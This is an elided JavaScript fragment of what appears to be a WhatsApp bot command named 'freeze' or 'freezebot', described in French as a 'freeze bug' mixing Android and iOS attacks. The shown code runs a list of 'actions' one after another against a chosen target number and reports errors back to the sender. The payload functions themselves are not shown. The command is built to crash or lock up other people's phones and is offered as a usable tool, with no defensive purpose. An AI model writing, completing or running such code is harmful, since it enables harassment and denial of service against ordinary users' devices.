...
const freeze = {
  name: "freeze",
  alias: ["freezebot"],
  description: "Freeze bug - exécute toutes les actions (Android/iOS Mix)",
  execute: async (sock, m, args, from, _, prefix, command) => {
    ...
    try {
      ...
      // ===== AJOUT : EXÉCUTION DE TOUTES LES ACTIONS SUPPLÉMENTAIRES =====
      for (const action of actions) {
        try {
          if (typeof action === "function") {
            await action(sock, target);
            await sleep(300); // petite pause entre chaque action
          }
        } catch (err) {
          console.error(`Erreur dans freeze action ${action.name}:`, err);
        }
      }
      ...
      await sock.sendMessage(from, { text: `❌ Erreur : ${err.message}` }, { quoted: m });
    }
  },
};
